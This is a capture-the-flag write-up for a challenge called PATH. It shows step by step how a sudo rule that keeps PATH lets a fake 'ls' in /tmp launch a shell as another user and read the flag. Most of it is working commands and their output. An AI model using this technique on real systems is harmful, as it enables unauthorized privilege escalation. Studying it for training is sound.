# PATH

## Write-Up

When entering the instance, we can find the `flag.txt` in the currect directory, we will find also a shell script `my_ls` :

```
ctf@path-57568c5f85-czp5h:~$ ls -l
total 8
-r--r----- 1 root ctf-cracked 40 Dec 20 18:44 flag.txt
-r-xr-xr-x 1 root root        21 Dec 20 18:44 my_ls
ctf@path-57568c5f85-czp5h:~$ cat my_ls
#!/bin/bash

ls -alh
```

It seems like our `my_ls` script is executing `ls` command.

Also when trying to read the `flag.txt`, unfortunatly, we can't read it. First thing to do is to check for sudo priviledges for our user :

```
ctf@path-57568c5f85-czp5h:~$ sudo -l
[sudo] password for ctf: 
Matching Defaults entries for ctf on path-57568c5f85-czp5h:
    env_reset, mail_badpass, env_keep+=PATH

User ctf may run the following commands on path-57568c5f85-czp5h:
    (ctf-cracked) /home/ctf/my_ls

```

Let's try to execute the `my_ls` script :

```
ctf@path-57568c5f85-czp5h:~$ sudo -u ctf-cracked ./my_ls 
total 28K
drwxr-xr-x 1 root root        4.0K Dec 24 16:22 .
drwxr-xr-x 1 root root        4.0K Dec 24 16:22 ..
-rw-r--r-- 1 root root         220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 root root        3.7K Jan  6  2022 .bashrc
-rw-r--r-- 1 root root         807 Jan  6  2022 .profile
-r--r----- 1 root ctf-cracked   40 Dec 20 18:44 flag.txt
-r-xr-xr-x 1 root root          21 Dec 20 18:44 my_ls

```

Nothing new, it just list content of current directory (it doesn't take arguments).


We can also try to check for what we can do with `suid` rights :

```
ctf@path-57568c5f85-czp5h:~$ find / -perm -u=s -type f
find: ‘/run/lock’: Permission denied
find: ‘/run/sudo’: Permission denied
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```


Now, moving on to the Now, moving on to the solution, and since the challenge is named `PATH`, Let's try to do some **Linux Privilege Escalation Using PATH Variable**. First, let's see the content of `$PATH` variable :

```
ctf@path-57568c5f85-czp5h:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Now, let's see if this variable is writable :

```

ctf@path-57568c5f85-czp5h:~$ PATH=""
ctf@path-57568c5f85-czp5h:~$ echo $PATH

ctf@path-57568c5f85-czp5h:~$ PATH=".:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
"
ctf@path-57568c5f85-czp5h:~$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
ctf@path-57568c5f85-czp5h:~$ export PATH=$PATH
```

Indeed, we can modify the content of the `PATH` variable and add other paths to the directories we like.

So, for the solution, let's try to use the `my_ls` script and this `PATH` vulnerability to do a Privilege Escalation. The main idea is to create a new `ls` command that actually pops a shell when it is executed. and to make it priviledged from the usual `ls` (since after trying, we can't write in the `/bin` folder, i.e modify original one), by adding a new path to a folder, that we can write and modify : `/tmp`.

```
ctf@path-57568c5f85-czp5h:~$ cd /tmp
ctf@path-57568c5f85-czp5h:/tmp$ echo "/bin/bash" > ls
ctf@path-57568c5f85-czp5h:/tmp$ chmod 777 ls
ctf@path-57568c5f85-czp5h:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
ctf@path-57568c5f85-czp5h:/tmp$ export PATH=/tmp:$PATH
ctf@path-57568c5f85-czp5h:/tmp$ cd /home/ctf/
ctf@path-57568c5f85-czp5h:~$ sudo -u ctf-cracked ./my_ls
[sudo] password for ctf
ctf-cracked@path-57568c5f85-czp5h:/home/ctf$ whoami
ctf-cracked
ctf-cracked@path-57568c5f85-czp5h:/home/ctf$ cat flag.txt
shellmates{R3l47iV3_P4TH_4R3_Dan9eRou$}
ctf-cracked@path-57568c5f85-czp5h:/home/ctf$ exit
```

## Flag

shellmates{R3l47iV3_P4TH_4R3_Dan9eRou$}

## More Information

Linux Privilege Escalation Using PATH Variable : https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/ => **Echo Command -1st Technique to spawn root privilege**